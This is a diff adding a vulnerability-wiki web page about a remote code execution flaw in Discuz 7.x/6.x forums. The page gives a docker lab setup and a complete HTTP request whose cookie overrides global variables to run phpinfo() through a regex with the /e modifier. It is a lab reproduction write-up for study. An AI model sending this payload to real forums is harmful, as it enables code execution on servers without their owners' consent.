@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Discuz/wooyun-2010-080723/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Discuz 7.x/6.x Remote Code Execution via Global Variable Override - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Discuz 7.x/6.x Remote Code Execution via Global Variable Override", url: "#_top", children: [
+              {title: "Environment Setup", url: "#environment-setup" },
+              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Discuz 7.x/6.x 全局变量防御绕过导致代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%EF%BC%88CVE-2018-14729%EF%BC%89Discuz%21%20X1.5%20~%20X2.5%20%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%8A%9F%E8%83%BD%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20Getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%EF%BC%88CVE-2018-14729%EF%BC%89Discuz%21%20X1.5%20~%20X2.5%20%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%8A%9F%E8%83%BD%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20Getshell/" class="btn btn-xs btn-link">
+        （CVE-2018-14729）Discuz!X 1.5 ~ X2.5 后台数据库备份功能远程命令执行 Getshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="discuz-7x6x-remote-code-execution-via-global-variable-override">Discuz 7.x/6.x Remote Code Execution via Global Variable Override<a class="headerlink" href="#discuz-7x6x-remote-code-execution-via-global-variable-override" title="Permanent link">&para;</a></h1>
+<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
+<p>Discuz is a popular forum software widely used in China. A remote code execution vulnerability exists in Discuz 7.x/6.x versions due to insufficient global variable protection.</p>
+<p>In PHP 5.3.x, the default value of <code>request_order</code> in php.ini is set to "GP", which means <code>$_REQUEST</code> no longer includes <code>$_COOKIE</code> by default. This allows attackers to override global variables through cookies by injecting <code>$GLOBALS</code>, leading to remote code execution.</p>
+<p>References:</p>
+<ul>
+<li><a href="https://www.secpulse.com/archives/2338.html">https://www.secpulse.com/archives/2338.html</a></li>
+</ul>
+<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
+<p>Execute the following command to start Discuz 7.2:</p>
+<div class="highlight"><pre><span></span><code>docker compose up -d
+</code></pre></div>
+<p>After starting the container, visit <code>http://your-ip:8080/install/</code> to install Discuz. Use the following database settings:</p>
+<ul>
+<li>Database Host: <code>db</code></li>
+<li>Database Name: <code>discuz</code></li>
+<li>Username: <code>root</code></li>
+<li>Password: <code>root</code></li>
+</ul>
+<p><img alt="" src="1.png" /></p>
+<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
+<p>After installation, find an existing post and send a request with the following cookie that contains the payload <code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code>:</p>
+<div class="highlight"><pre><span></span><code>GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1
+Host: your-ip:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+Connection: close
+</code></pre></div>
+<p>The <code>phpinfo()</code> function will be successfully executed, demonstrating the remote code execution vulnerability:</p>
+<p><img alt="" src="2.png" /></p>
+<blockquote>
+<p>Note: Some articles online claim that a post with an emoji comment is required, but the actual test found that it was not necessary, and the reason still needs to be analyzed from the code.</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Discuz 7.x/6.x 全局变量防御绕过导致代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%EF%BC%88CVE-2018-14729%EF%BC%89Discuz%21%20X1.5%20~%20X2.5%20%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%8A%9F%E8%83%BD%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20Getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%EF%BC%88CVE-2018-14729%EF%BC%89Discuz%21%20X1.5%20~%20X2.5%20%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%8A%9F%E8%83%BD%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20Getshell/" class="btn btn-xs btn-link">
+        （CVE-2018-14729）Discuz!X 1.5 ~ X2.5 后台数据库备份功能远程命令执行 Getshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
